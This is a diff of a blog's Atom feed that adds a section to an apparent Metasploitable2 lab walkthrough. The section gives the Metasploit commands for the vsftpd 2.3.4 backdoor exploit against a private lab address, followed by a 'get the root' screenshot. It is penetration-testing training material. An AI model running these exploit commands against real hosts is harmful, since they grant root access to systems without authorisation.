@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-22T15:50:45-05:00</updated>
+  <updated>2016-06-22T16:05:50-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -246,6 +246,21 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 209.95 seconds
            Raw packets sent: 65555 (2.885MB) | Rcvd: 65552 (2.623MB)
 </code></pre>
+
+<h3>vsftpd exploit:</h3>
+
+<p>search vsftpd</p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<pre><code>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) &gt; set rhost 192.168.79.179
+msf exploit(vsftpd_234_backdoor) &gt; exploit 
+</code></pre>
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
